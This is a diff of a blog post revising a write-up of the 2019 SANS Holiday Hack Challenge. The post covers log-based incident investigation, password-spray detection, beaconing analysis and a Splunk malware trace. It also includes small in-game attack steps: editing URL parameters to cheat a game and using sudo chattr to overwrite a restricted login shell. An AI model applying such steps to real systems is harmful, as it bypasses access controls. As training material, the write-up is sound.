@@ -5,7 +5,16 @@ date:   2020-01-14
 tags: security
 ---
 
-For the past couple of years, SANS has spoiled us with an excellent annual "Holiday hack challenge".
+For the past couple of years, SANS has spoilt us with an excellent annual "Holiday hack challenge". This is mostly for fun, even though the people who formulate a write-up have a chance to win one of the prizes offered by SANS.
+
+I've tried my luck at the Holiday Hack Challenge in the past few years, but I didn't take the time to spend some time on the write-up. So this is my first attempt!
+
+A few notes before we start:
+* I'm not a native English speaker, so please forgive any grammatical mistake in this write-up.
+* I'm a software engineer, so I'll use scripts whenever I can to perform repetitive tasks on my behalf. I'll use Python 3 as a scripting language, unless I absolutely need a library/tool which is not available in Python.
+* I'm not trying to solve this challenge as fast as I can (and, as far as I know, there's no prize for the fastest submission). Instead, I might here and there take a detour and explore things I did not know about, as I stumble upon them.
+
+Let's get going!
 
 * TOC
 {:toc}
@@ -24,7 +33,7 @@ A quick look at [ed documentation](https://www.gnu.org/software/ed/manual/ed_man
 
 After getting into the courtyard and heading east, we meet Tangle who needs to guess the keypad's 4-digits code. Tangle knows that one digit of the code is repeated twice, and that the code is a prime number. We can also clearly see, on the keypad itself, that the digits 1, 3 and 7 have been used way more than the other ones.
 
-That should be enough to limit the number of candidates! The Python script below will iterate through all the 4-digits code containing 1, 3 and 7 (one of them being repeated once), and will only keep the ones which are prime. We'll use a super simple [prime](https://en.wikipedia.org/wiki/Prime_number) detection algorithm; that's not the most efficient one, but that will definitely be quick enough in our case.
+That should be enough to limit the number of possibilities. The Python script below will iterate through all the 4-digits code containing 1, 3 and 7 (one of them being repeated once), and will only keep the ones which are prime. We'll use a super simple [prime](https://en.wikipedia.org/wiki/Prime_number) detection algorithm; that's not the most efficient one, but that will definitely be quick enough in our case.
 
 {% highlight python %}
 from math import sqrt
@@ -58,7 +67,7 @@ Pepper needs some help to go through the logs collected in [Graylog](https://www
 > Minty CandyCane reported some weird activity on his computer after he clicked on a link in Firefox for a cookie recipe and downloaded a file.
 > What is the full-path + filename of the first malicious file downloaded by Minty?
 
-Let's search for "cookie* Downloads", as we expected the malicious file downloaded by Minty to be located in the Downloads folder of Minty's home directory. The oldest event we see is [this event](https://graylog.elfu.org/messages/graylog_0/5c8ec910-1b70-11ea-b211-0242ac120005), which confirms that Minty launched *C:\Users\minty\Downloads\cookie_recipe.exe*
+Let's search for "cookie* Downloads", as we expected the malicious file downloaded by Minty to be located in the Downloads folder of Minty's home directory. The oldest event we see is [this event](https://graylog.elfu.org/messages/graylog_0/5c8ec910-1b70-11ea-b211-0242ac120005), which confirms that Minty launched *C:\Users\minty\Downloads\cookie_recipe.exe*.s
 
 > The malicious file downloaded and executed by Minty gave the attacker remote access to his machine. What was the ip:port the malicious file connected to first?
 
@@ -70,31 +79,31 @@ We can still keep the query used for the previous question, and see what happene
 
 > What is the one-word service name the attacker used to escalate privileges?
 
-If we keep following the stream of event that was revealed by the query used two questions ago, we can see that the malware downloaded a file called `cookie_recipe2.exe`, then [uses *webexservice*](https://graylog.elfu.org/messages/graylog_0/5cf94ab0-1b70-11ea-b211-0242ac120005) to run it with escalated privileges.
+If we keep following the stream of events that was revealed by the query used two questions ago, we can see that the malware downloaded a file called `cookie_recipe2.exe`, then [uses *webexservice*](https://graylog.elfu.org/messages/graylog_0/5cf94ab0-1b70-11ea-b211-0242ac120005) to run it with escalated privileges.
 
 > What is the file-path + filename of the binary ran by the attacker to dump credentials?
 
-So now, we want to follow what `cookie_recipe2.exe` did. Let's update our query, and use `ParentProcessImage:C\:\\Users\\minty\\Downloads\\cookie_recipe2.exe OR ProcessImage:C\:\\Users\\minty\\Downloads\\cookie_recipe2.exe` instead. After interrogating the C&C server, we can see that this new malicious file downloaded three files:
+So now, we want to follow what `cookie_recipe2.exe` did. Let's update our query, and use `ParentProcessImage:C\:\\Users\\minty\\Downloads\\cookie_recipe2.exe OR ProcessImage:C\:\\Users\\minty\\Downloads\\cookie_recipe2.exe` instead. After interrogating the C&C server, we can see that this new malicious file downloaded four files:
 * [First](https://graylog.elfu.org/messages/graylog_0/5d97d4a1-1b70-11ea-b211-0242ac120005), it downloaded a file called `mimikatz.exe` and saved it as `C:\cookie.exe`
 * [Then](https://graylog.elfu.org/messages/graylog_0/5d9e3d40-1b70-11ea-b211-0242ac120005), it downloaded a file called `mimikatz.dll` and saved it as `C:\mimikatz.dll`
 * [Then](https://graylog.elfu.org/messages/graylog_0/5da14a80-1b70-11ea-b211-0242ac120005), it downloaded a file called `mimilove.exe` and saved it as `C:\cookielove.exe`
 * [Finally](https://graylog.elfu.org/messages/graylog_0/5dae90f0-1b70-11ea-b211-0242ac120005), it downloaded a file called `mimidrv.sys` and saved it as `C:\mimidrv.sys`
 
-A few seconds spent on Google show that [mimikatz](https://github.com/gentilkiwi/mimikatz) seems to be a tool that can be used to extract things such a password hashes from memory. So we're probably on the right track!
+A few seconds spent on Google show that [mimikatz](https://github.com/gentilkiwi/mimikatz) is a tool that can be used to extract things such a password hashes from memory. So we're probably on the right track!
 
-Then the attacker tries to execute `C:\mimikatz.exe` (as shown in [this event](https://graylog.elfu.org/messages/graylog_0/5dbe9680-1b70-11ea-b211-0242ac120005)), forgetting that he hid it under another name (that was funny :)). And finally, the attacker uses `C:\cookie.exe` to dump the credentials (as shown in [this event](https://graylog.elfu.org/messages/graylog_0/5dc5e982-1b70-11ea-b211-0242ac120005)).
+Then the attacker tries to execute `C:\mimikatz.exe` (as shown in [this event](https://graylog.elfu.org/messages/graylog_0/5dbe9680-1b70-11ea-b211-0242ac120005)), forgetting that he hid it under an obfuscated name (that was funny :)). And finally, the attacker uses `C:\cookie.exe` to dump the credentials (as shown in [this event](https://graylog.elfu.org/messages/graylog_0/5dc5e982-1b70-11ea-b211-0242ac120005)).
 
 > The attacker pivoted to another workstation using credentials gained from Minty's computer. Which account name was used to pivot to another machine?
 
 The last command executed by `cookie_recipe2.exe` is an `ipconfig`, at 05:47:04. Let's try to see if we see some other activity from the C&C server after that date. We can "zoom" on the 5 minutes surrounding this event at 05:47:04, use the C&C server IP address as an additional filter, and [see what happened during this timeframe](https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=absolute&fields=message%2Csource&width=1536&highlightMessage=5de09d70-1b70-11ea-b211-0242ac120005&from=2019-11-19T05%3A42%3A04.000Z&timerange-absolute-from=2019-11-19%2005%3A42%3A04&to=2019-11-19T05%3A52%3A04.000Z&timerange-absolute-to=2019-11-19%2005%3A52%3A04&q=source%3A%22elfu%5C-res%5C-wks1%22%20AND%20gl2_source_input%3A%225defd222adbe1d0012fab8ca%22%20AND%20%22192.168.247.175%22).
 
-We can see multiple failed [NTLM](https://en.wikipedia.org/wiki/NT_LAN_Manager) login attempts coming from the attacker's IP, as well as a [successfull login](https://graylog.elfu.org/messages/graylog_0/5e04a030-1b70-11ea-b211-0242ac120005), using *alabaster*'s credentials.
+We can see multiple failed [NTLM](https://en.wikipedia.org/wiki/NT_LAN_Manager) login attempts coming from the attacker's IP, as well as a [successful login](https://graylog.elfu.org/messages/graylog_0/5e04a030-1b70-11ea-b211-0242ac120005), using *alabaster*'s credentials.
 
 > What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection to another machine?
 
-Let's now search for the [RDP](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol) connections from the attacker's IP, on the default port 3389, using the query `DestinationPort:3389 AND SourceIp:"192.168.247.175"`. We get 4 results; but none of the corresponding timestamps is the correct response. And indeed, these are the timestamps when a connection is opened (on port 3389); we are asked to find the moment when the attacker manages to log in using that connection.
+Let's now search for the [RDP](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol) connections from the attacker's IP, on the default port 3389, using the query `DestinationPort:3389 AND SourceIp:"192.168.247.175"`. We get 4 results; but none of the corresponding timestamps is the correct response. And indeed, these are the timestamps when a connection is opened (on port 3389); we are asked to find the moment when the attacker managed to log in using that connection.
 
-A [little bit of research](https://jpcertcc.github.io/ToolAnalysisResultSheet/details/mstsc.htm#KeyEvents-Destination) shows that, after a successfull RDP login attempt, we should see a log containing an EventID 4624 ("An account was successfully logged on."), with a Logon Type 10 ("Terminal Service/Remote Desktop"). So let's try to display these events, with the query `EventID:4624 AND LogonType:10`. Bingo! We only fetched [one event](https://graylog.elfu.org/messages/graylog_0/6c638510-1b70-11ea-b211-0242ac120005
+A [little bit of research](https://jpcertcc.github.io/ToolAnalysisResultSheet/details/mstsc.htm#KeyEvents-Destination) shows that, after a successful RDP login attempt, we should see a log containing an EventID 4624 ("An account was successfully logged on."), with a Logon Type 10 ("Terminal Service/Remote Desktop"). So let's try to display these events, with the query `EventID:4624 AND LogonType:10`. Bingo! We only fetched [one event](https://graylog.elfu.org/messages/graylog_0/6c638510-1b70-11ea-b211-0242ac120005
 ), at *06:04:28*, and we can even see that the connection was established from the attacker's IP (thanks to the field SourceNetworkAddress). The session seems to last until 06:08:32.
 
 > The attacker navigates the file system of a third host using their Remote Desktop Connection to the second host. What is the SourceHostName,DestinationHostname,LogonType of this connection?
@@ -110,11 +119,11 @@ Let's check if there's any login attempt from alabaster to `elfu-res-wks3` durin
 
 We don't see much of what the attacker does on elfu-res-wks3. However, we can come back to the logs of the second host, and check what the attacker did after connecting to the third host ([between 06:07:22 and 06:08:32](https://graylog.elfu.org/streams/000000000000000000000001/search?rangetype=absolute&fields=source%2CLogonType%2Cmessage%2CProcessImage&width=1536&highlightMessage=6c638510-1b70-11ea-b211-0242ac120005&from=2019-11-19T06%3A07%3A22.000Z&timerange-absolute-from=2019-11-19%2006%3A07%3A22&to=2019-11-19T06%3A08%3A32.000Z&timerange-absolute-to=2019-11-19%2006%3A08%3A32&q=source%3A%22elfu%5C-res%5C-wks2%22%20AND%20alabaster)).
 
-We quickly spot [an event](https://graylog.elfu.org/messages/graylog_0/6650a630-1b70-11ea-b211-0242ac120005) containing the name and full path of the secret file, after it has been transferred from the third host:
+We quickly spot [an event](https://graylog.elfu.org/messages/graylog_0/6650a630-1b70-11ea-b211-0242ac120005) containing the name and full path of the secret file, after it has been transferred from the third host: *C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf*.
 
 > What is the IPv4 address (as found in logs) the secret research document was exfiltrated to?
 
-Now that we have the file name, we can use it to find the command that was used to exfiltrate it. We'll see in [this event](https://graylog.elfu.org/messages/graylog_0/5f9cf370-1b70-11ea-b211-0242ac120005) that it was sent to pastebin.com. Then zooming around this event (not more than a few seconds), we finally find [this event](https://graylog.elfu.org/messages/graylog_0/5f9e04e0-1b70-11ea-b211-0242ac120005) which logs out established outgoing connection to pastebin, with the IP of the remote server: *104.22.3.84*.
+Now that we have the file name, we can use it as a search criteria, in order to find the command that was used to exfiltrate it. We'll see in [this event](https://graylog.elfu.org/messages/graylog_0/5f9cf370-1b70-11ea-b211-0242ac120005) that it was sent to pastebin.com. Then zooming around this event (not more than a few seconds), we finally find [this event](https://graylog.elfu.org/messages/graylog_0/5f9e04e0-1b70-11ea-b211-0242ac120005) which logs out established outgoing connection to pastebin, with the IP of the remote server: *104.22.3.84*.
 
 Incident report completed!
 
@@ -126,7 +135,7 @@ At first glance, it seems that we're given some resources (money, reindeers, foo
 
 > hhc://trail.hhc/trail/?difficulty=0&distance=317&money=5000&pace=0&curmonth=7&curday=4&reindeer=2&runners=2&ammo=96&meds=20&food=376&name0=Emmanuel&health0=100&cond0=0&causeofdeath0=&deathday0=0&deathmonth0=0&name1=Vlad&health1=100&cond1=0&causeofdeath1=&deathday1=0&deathmonth1=0&name2=Michael&health2=100&cond2=0&causeofdeath2=&deathday2=0&deathmonth2=0&name3=John&health3=100&cond3=2&causeofdeath3=&deathday3=0&deathmonth3=0
 
-Interesting. The current "situation" seems to be encoded directly in the URL. What happens if we update the value of parameter `distance` to 7999 (instead of 317) ? We're now 1 mile away from Kringlecon, and our resources are still exactly the same. We just need to press "Go" one last time to pass the finish line and complete the game.
+Interesting. The current state of the game seems to be encoded directly in the URL. What happens if we update the value of parameter `distance` to 7999 (instead of 317) ? We're now 1 mile away from Kringlecon, and our resources are still exactly the same. We just need to press "Go" one last time to pass the finish line and complete the game.
 
 ## Kent Tinseltooth
 
@@ -168,8 +177,10 @@ It can take a few seconds for the game to detect that the firewalling rules are 
 
 ## SugarPlum Mary
 
-Let's now get out of the building, and head east to the Hermey Hall. Right in front of us stands SugarPlum Mary, who just wants to list the files in in home directory.
-Someone played a trick on him, and running `ls` justs output: `This isn't the ls you're looking for`
+Let's now get out of the building, and head east to the Hermey Hall. Right in front of us stands SugarPlum Mary, who just wants to list the files in her home directory.
+Someone played a trick on her, and running `ls` just outputs:
+
+> This isn't the ls you're looking for
 
 So which `ls` is actually used here?
 {% highlight bash %}
@@ -184,7 +195,7 @@ And indeed, `/bin/ls` is there and correctly lists the files in our friend's hom
 
 Let's now go into the Speaker UNpreparedness Room, where we meet Alabaster. This elf wants to log in (using his completely secure login and password), and land into in a Bash shell. As you probably guessed, the natural way (`su alabaster_snowball`) will not exactly work (but you should definitely try first).
 
-As mentioned in the hints, the user's shell is determined by the contents of /etc/passwd
+As mentioned in the hints, the user's shell is determined by the contents of /etc/passwd:
 {% highlight bash %}
 $ cat /etc/passwd | grep alabaster_snowball
 alabaster_snowball:x:1001:1001::/home/alabaster_snowball:/bin/nsh
@@ -202,8 +213,8 @@ $ cp /bin/bash /bin/nsh
 cp: cannot create regular file '/bin/nsh': Operation not permitted
 {% endhighlight %}
 
-That's not what I expected. Please not that the error message is not `Permission denied`: this is *not* a permission issue. A little bit of Googling shows us that this error message comes up when one tries to remove/alter an [immutable file](https://www.tecmint.com/make-file-directory-undeletable-immutable-in-linux/).
-This requires root permissions though. But fortunately, running `sudo -l` shows that our current user can run `chattr` as root!
+That's not what I expected. Please note that the error message is not `Permission denied`: this is *not* a permission issue. A little bit of Googling shows that this error message comes up when one tries to remove/alter an [immutable file](https://www.tecmint.com/make-file-directory-undeletable-immutable-in-linux/).
+We can turn an immutable file into a mutable file, but it requires root permissions though. But fortunately, running `sudo -l` shows that our current user can run `chattr` as root!
 
 {% highlight bash %}
 $ sudo chattr -i /bin/nsh
@@ -221,6 +232,8 @@ You did it! Congratulations!
 
 We're done with the Speaker UNpreparedness Room; let's get out, and step into the Netwars room. Here we're greeted by Holly Evergreen, who is unable to find his way to the exam solutions stored in Mongo.
 
+Let's try to connect to the database server:
+
 {% highlight bash %}
 $ mongo
 MongoDB shell version v3.6.3
@@ -234,7 +247,7 @@ connect@src/mongo/shell/mongo.js:251:13
 exception: connect failed
 {% endhighlight %}
 
-So `mongod` is either not running on this machine, or not listening on the default port 27017. We can try to find the listening port of `mongod` using netstat, but we'll need to be root... Let's see what we can do:
+So `mongod` is either not running on this machine, or not listening on the default port 27017. We can try to find the listening port of `mongod` using netstat, but we'll need to be root for that... Let's see what we can do:
 {% highlight bash %}
 $ sudo -l
 User elf may run the following commands on f12e9b6f53e3:
@@ -243,9 +256,9 @@ User elf may run the following commands on f12e9b6f53e3:
     (root) SETENV: NOPASSWD: /usr/bin/python /updater.py
 {% endhighlight %}
 
-Funny: we can see here the port used by `mongod` :) Let's connect to the database server which listens on port 12121: `mongo localhost:12121`
+Funny: we can see here the port used by `mongod` :) Let's connect to the database server which listens on port 12121, using the command: `mongo localhost:12121`
 
-For those familiar with SQL and not familiar with Mongo, Mongo provides a ["mapping chart"](https://docs.mongodb.com/manual/reference/sql-comparison/) that can help to "translate" Mongo concepts into their SQL counterpart.
+For those familiar with SQL and not familiar with Mongo, Mongo provides a ["mapping chart"](https://docs.mongodb.com/manual/reference/sql-comparison/) that can help to translate Mongo concepts into their SQL counterpart.
 
 {% highlight javascript %}
 > db
@@ -363,7 +376,7 @@ I have many name=value variables that I share to applications system wide. At a 
 eal my secrets once you Get my Child Items.
 {% endhighlight %}
 
-This description reminds me of environment variables. These are certainly available in PowerShell too, right ...? [Yep they are!](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables?view=powershell-6) Let's list them:
+This description reminds me of environment variables. These are certainly available in PowerShell too, right ...? [Yep, there are!](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables?view=powershell-6) Let's list them:
 {% highlight powershell %}
 PS /home/elf> Set-Location Env:
 PS Env:/> Get-ChildItem
@@ -464,7 +477,7 @@ When we un-compressed the archive in the step above, we not only obtained the EL
 >
 > 25520151A320B5B0D21561F92C8F6224
 
-We can brute-force our way in, by looking at every file in the folder `/home/elf/depths` (recursively), computing its MD5 digest, and comparing it with the given value.
+We can brute-force our way in, by looking at every file in the folder `/home/elf/depths` (recursively), computing its MD5 digest, and comparing it with the given value. Here's a PowerShell script to do that:
 
 {% highlight powershell %}
 > $files = Get-ChildItem -Path ./depths/ -Recurse
@@ -490,17 +503,17 @@ We got the third parameter: the temperature must be set to -33.5.
 
 ### Gas composition
 
-The fourth and last parameter will require several steps. Let's start from the hint that was given together with the temperature value:
+It will take several steps to reveal the value of the fourth and last parameter. Let's start from the hint that was given together with the temperature value:
 
 >I am one of many thousand similar txt's contained within the deepest of /home/elf/depths. Finding
 >me will give you the most strength but doing so will require Piping all the FullName's to Sort Length.
 
 We want to find the *deepest* files in `./depth`: we can do that by:
 * Looping over all the files in `./depth`
-* For each file, compute a new field called `Depth`, which is the length of it's attribute `FullName`. [This can be done using Select-Object](https://4sysops.com/archives/add-a-calculated-property-with-select-object-in-powershell/).
+* For each file, compute a new field called `Depth`, which is the length of its attribute `FullName`. [This can be done using Select-Object](https://4sysops.com/archives/add-a-calculated-property-with-select-object-in-powershell/).
 * Then sort the files by Depth, and keeps the 2 deepest file (just in case there's an ex-aequo).
 
-Translated into PowerShel:
+Translated into PowerShell:
 {% highlight powershell %}
 Get-ChildItem -Path ./depths -Recurse | Select-Object FullName, @{Name = 'Depth'; Expression = {$_.FullName.Length}} | sort Depth | Select-Object -Last 2 | Format-List -Property *
     FullName : /home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown/
@@ -533,7 +546,7 @@ Do this for me and then you /shall/see
 
 (Please note that the content of the file will actually change for each and every attempt)
 
-We need to kill the process belonging to the user listed below *in the correct order*. Nothing complicated here, as `Get-Process` (with the option `-IncludeUserName`) will let us list the ongoing processes and the user who started them. Once the process are killed, the file `/shall/see` becomes readable:
+We need to kill the process belonging to the users listed above *in the correct order*. Nothing complicated here, as `Get-Process` (with the option `-IncludeUserName`) will let us list the ongoing processes and the users who started them. Once the process are killed, the file `/shall/see` becomes readable:
 
 {% highlight powershell %}
 Get-Process -IncludeUserName
@@ -557,7 +570,7 @@ Get-Content /shall/see
 Get the .xml children of /etc - an event log to be found. Group all .Id's and the last thing will be in the Properties of the lonely unique event Id.
 {% endhighlight %}
 
-Another riddle?! Don't worry, that's the last one. Following the hint, let's look for an XML file in `/etc`
+Another riddle?! Don't worry, that's the last one. Following the hint, let's look for an XML file in `/etc`:
 
 {% highlight powershell %}
 Get-ChildItem -Path /etc -Recurse -Include *xml -ErrorAction SilentlyContinue
@@ -647,7 +660,12 @@ Let's go out of the crowded laboratory and breath some fresh air in the courtyar
 
 Someone wanted to hide most of the blackmail's content, by hiding it with a "Confidential" sticker. This is yet another example of a frequent mistake: instead of removing the information, the person just added a sticker on top of it, hoping to hide it. This means that the secret information is somehow still present in the file.
 
-There are probably hundreds of ways to retrieve it. I opened the document in Chrome's builtin PDF view, and realized that the text was selectable! A simple copy-paste from Chrome to my favourite text editor revealed the letter:
+There are probably hundreds of ways to retrieve it. I opened the document in Chrome's builtin PDF viewer, and realized that the text was selectable!
+
+![The text can be selected using Chrome's PDF viewer](/assets/2020-01-14-2019-SANS-holiday-hack-challenge-write-up/chrome_pdf_text_selection.JPG)
+
+
+A simple copy-paste from Chrome to my favourite text editor revealed the letter:
 
 > Date: February 28, 2019
 >
@@ -685,7 +703,7 @@ There are probably hundreds of ways to retrieve it. I opened the document in Chr
 > We're seeing attacks against the Elf U domain! Using [the event log data](https://downloads.elfu.org/Security.evtx.zip), identify the user account that the attacker compromised using a password spray attack. Bushy Evergreen is hanging out in the train station and may be able to help you out.
 
 The hints given by Bushy Evergeen suggest to look at this open-source tool called [DeepBlueCLI](https://github.com/sans-blue-team/DeepBlueCLI).
-This tool comes in two flavours: there's a Python version and a PowerShell version. As much as we enjoyed playing with PowerShell during the previous elf challenge, let's use the python version for now.
+This tool comes in two flavours: there's a Python version and a PowerShell version. As much as we enjoyed playing with PowerShell during the previous elf challenge, let's use the Python version for now.
 
 The most painful part of the set-up is actually to install [libevtx](https://github.com/libyal/libevtx), on which the Python version of DeepBlueCLI relies. I'm not quite sure what this library is doing, but it requires an insane amount of dependencies. </grumble>
 
@@ -701,9 +719,9 @@ What? Nothing happened ? Are we using this tool correclty? Let's check out the P
 >
 >Current version: alpha. It supports command line parsing for Security event log 4688, PowerShell log 4014, and Sysmon log 1. Will be porting more functionality from DeepBlueCLI after DerbyCon 7.
 
-How unlucky we are. The Python version contains only a limited subset of the PowerShell version, and nothing related to password spray. We can try to fall back to the PowerShell version (I actually tried), but we won't get far: [Get-WinEvent is, as of now, a Windows-only cmdlet](https://github.com/PowerShell/PowerShell/issues/5810).
+How unlucky we are. The Python version contains only a limited subset of the PowerShell version, and nothing related to password spray. We can try to fall back to the PowerShell version (I actually tried), but we won't get far: [Get-WinEvent is, as of now, a Windows-only cmdlet](https://github.com/PowerShell/PowerShell/issues/5810). So we won't be able to run this using the PowerShell interpreter for Linux.
 
-Alright, let's roll up our sleeves and implement the password spray detection in the Python version of DeepBlueCLI.
+Let's roll up our sleeves and implement the password spray detection in the Python version of DeepBlueCLI.
 
 (An hour passes)
 
@@ -720,7 +738,7 @@ Creation time     : Nov 19, 2019 12:22:51.594765600 UTC
 {% endhighlight %}
 
 It looks like the spray attack happened on November 19th, from 12:21:44 to 12:22:51.
-Do we see any successfull login ([eventid 4624](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624)) at that time? Using a couple of greps (with the handy options `A` and `B`, allowing to keep lines surrounding the matching lines), we can extract the users (6th string of the event's data) who managed to login at that time.
+Do we see any successful login ([eventid 4624](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624)) at that time? Using a couple of greps (with the handy options `A` and `B`, allowing to keep lines surrounding the matching lines), we can extract the users (6th string of the event's data) who managed to login at that time.
 
 {% highlight bash %}
 $ cat result | grep "0x00001210" -B 5 -A 28 | grep "Nov 19, 2019 12:2[12]" -A 32 | grep "String: 6" | sort | uniq
@@ -835,11 +853,11 @@ Once again, the installation is not as smooth as it could be </grumble again>:
 {% highlight bash %}
 if [ "$_OS" != "Ubuntu" -a "$_OS" != "CentOS" -a "$_OS" != "RedHatEnterpriseServer" ]; then
 {% endhighlight %}
-Let's be adventurous and replace "RedHatEnterpriseServer" by "Fedora" in the installing script
+Let's be adventurous and replace "RedHatEnterpriseServer" by "Fedora" in the installing script.
 * The installer also struggles to install `bro` and `mongo`. We probably won't need `bro`, and we can install `mongo` using [this procedure](https://developer.fedoraproject.org/tech/database/mongodb/about.html)
 * Then we can finally install RITA: `sudo ./install.sh --disable-bro --disable-mongo`
 * But when we try to use it, we get yet another error: `Failed to connect to database: unsupported version of MongoDB. 4.0.14 not within [3.2.0, 3.7.0)`
-MongoDB 3.7 was the development series just before MongoDB 4..0 (stable series) was released, so whatever ran with MongoDB 3.7 should still work with 4.0. We'll try our luck by changing `MaxMongoDBVersion` in `database/db.go`, and [building RITA manually](https://github.com/activecm/rita/blob/master/docs/Manual%20Installation.md)
+MongoDB 3.7 was the development series just before MongoDB 4.0 (stable series) was released, so whatever ran with MongoDB 3.7 should still work with 4.0. We'll try our luck by changing `MaxMongoDBVersion` in `database/db.go`, then [building RITA manually](https://github.com/activecm/rita/blob/master/docs/Manual%20Installation.md).
 
 Don't forget to also "uncomment" the "InternalSubnet" section of `/etc/rita/config.yaml`.
 
@@ -857,14 +875,16 @@ The "Beacons" report shows that `192.168.134.130` shows signs of [beaconing](htt
 
 > Access [https://splunk.elfu.org/](https://splunk.elfu.org/) as elf with password elfsocks. What was the message for Kent that the adversary embedded in this attack? The SOC folks at that link will help you along! For hints on achieving this objective, please visit the Laboratory in Hermey Hall and talk with Prof. Banas.
 
-Splunk! I happily use that tool on an almost daily basis at work, so I'm glad to finally see it used in SANS' holiday hack challenge. Prof. Banas will actually not help us that much during this challenge; instead, let's just log in Splunk and follow the hints given by Alice Bluebird in the SOC Secure chat.
+Splunk! I happily use that tool on an almost daily basis at work, so I'm glad to finally see it used in SANS' holiday hack challenge. Prof. Banas will actually not help us that much during this challenge; instead, let's just log in Splunk and start talking with Alice Bluebird in the SOC Secure chat.
 
-In my opinion, this challenge is pretty hard if you don't use the hints given by Alice, but it's too straightforward if you follow the training questions. So if you don't manage to solve this challenge without any hints, but still want a bit of challenge, please find below a few hints of mine:
-* Professor Banas computer was hacked, and a sensitive file was exfiltrated; find when this was done.
-* Then find the malware that did that, and find out how this ended up on Professor Banas computer.
-* stoQ logs are indexed in Splunk. Using these, identify the path to the artifact containing the malware, and download it from [http://elfu-soc.s3-website-us-east-1.amazonaws.com]
+In my opinion, this challenge is pretty hard if you don't use the hints given by Alice, but it's too straightforward if you follow the training questions. So if you don't manage to solve this challenge without any hints, but still want a bit of challenge, I would advise you to follow the steps below:
+1. Professor Banas computer was hacked, and a sensitive file was exfiltrated; find when this was done.
+2. Then find the malware that did that, and find out how this ended up on Professor Banas computer.
+3. stoQ logs are indexed in Splunk. Using these, identify the path to the artifact containing the malware, and download it from (here)[http://elfu-soc.s3-website-us-east-1.amazonaws.com].
 
-### Finding the exfiltrated file
+I'll follow these in the write-up of this objective below.
+
+### Step 1: Finding the exfiltrated file
 
 Let's start with a rather simple search to see what kind of events related to Prof. Banas files are there. Since our dear professor is a Windows user, we expect his documents to be located in the folder "`C:\username\Documents\`", and we expect his username to contain the string `banas`. So let's go with the simple search :
 
@@ -875,7 +895,7 @@ Let's start with a rather simple search to see what kind of events related to Pr
 The very first event yielded by this query definitely looks like an exfiltration of the file `C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt`, done on
 08/25/2019 at 09:20:23 AM.
 
-### Find the malware, and how it was deployed on Prof. Banas' computer
+### Step 2: Find the malware, and how it was deployed on Prof. Banas' computer
 
 Unfortunately, in this event, we can't see the process which triggered the exfiltration. In order to find the malware, let's zoom over the 30 seconds surrounding the exfiltration, and [only keep the events containing a process id](https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20processid&display.page.search.mode=verbose&dispatch.sample_ratio=1&earliest=1566753593&latest=1566753653.001&display.events.type=raw&sid=1577975346.1508). With the following query, we can have an overview of who's doing what:
 
@@ -889,10 +909,11 @@ Process 5864 seems to be the one doing all the "network" operations. We'll try t
 ProcessId=5864 | tail 1
 {% endhighlight %}
 
-I expected to find something using the parent's process id (3088), but the event we found in the previous search seems to be the only one containing "3088" :( So let's use again the "zoom" technique: we'll zoom on the 30 seconds before this process what launched, and [check the sysmon logs generated during this fimeframe](https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20*%20sourcetype%3D%22XmlWinEventLog%3AMicrosoft-Windows-Sysmon%2FOperational%22&display.page.search.mode=verbose&dispatch.sample_ratio=1&earliest=1566753485&latest=1566753545.001&display.events.type=raw&display.page.search.tab=events&display.general.type=events&sid=1577976378.1780).
+We can see here the PowerShell command which triggered the exfiltration. I expected to pivot off the parent's process id (3088), but the event we found in the previous search seems to be the only one containing "3088" :(
 
-We can quickly spot a couple of events related to MS Word, and we understand that Prof. Banas actually opened the file `
-C:\Windows\Temp\Temp1_Buttercups_HOL404_assignment (002).zip\19th Century Holiday Cheer Assignment.docm` just before the malware started exfiltrating files. This file is hence our prime suspect!
+So let's use again the "zoom" technique: we'll zoom on the 30 seconds before this process what launched, and [check the sysmon logs generated during this fimeframe](https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20*%20sourcetype%3D%22XmlWinEventLog%3AMicrosoft-Windows-Sysmon%2FOperational%22&display.page.search.mode=verbose&dispatch.sample_ratio=1&earliest=1566753485&latest=1566753545.001&display.events.type=raw&display.page.search.tab=events&display.general.type=events&sid=1577976378.1780).
+
+We can quickly spot a couple of events related to MS Word, and we understand that Prof. Banas actually opened the file `C:\Windows\Temp\Temp1_Buttercups_HOL404_assignment (002).zip\19th Century Holiday Cheer Assignment.docm` just before the malware started exfiltrating files. This file is hence our prime suspect!
 
 To understand how it got there, let's zoom out again, and check [all the events containing the filename `19th Century Holiday Cheer Assignment.docm`](https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20%2219th%20Century%20Holiday%20Cheer%20Assignment.docm%22&earliest=0&latest=&display.page.search.mode=verbose&dispatch.sample_ratio=1&sid=1577976739.1823). The oldest event containing this filename is an event produced by stoQ, which tells us that this file was sent as a mail attachment to the professor. In the same event, we can by the way see the email's content:
 
@@ -900,7 +921,7 @@ To understand how it got there, let's zoom out again, and check [all the events 
 
 That's a fishy message if ever there was one! We can be confident that the malware was indeed contained in this .docm file, and that it was sent to Prof. Banas by email.
 
-### Find the artifact
+### Step 3: Find the artifact
 
 The artifacts scanned by stoQ are archived in an [S3 bucket](http://elfu-soc.s3-website-us-east-1.amazonaws.com), with a randomish filename. The filename is contained in the Splunk event; we can use a couple fo splunk commands to manipulate that JSON blob, or just visualize it with a JSON beautifier:
 
@@ -970,15 +991,15 @@ $ curl https://elfu-soc.s3.amazonaws.com/stoQ%20Artifacts/home/ubuntu/archive/f/
 
 > Gain access to the steam tunnels. Who took the turtle doves? Please tell us their first and last name. For hints on achieving this objective, please visit Minty's dorm room and talk with Minty Candy Cane.
 
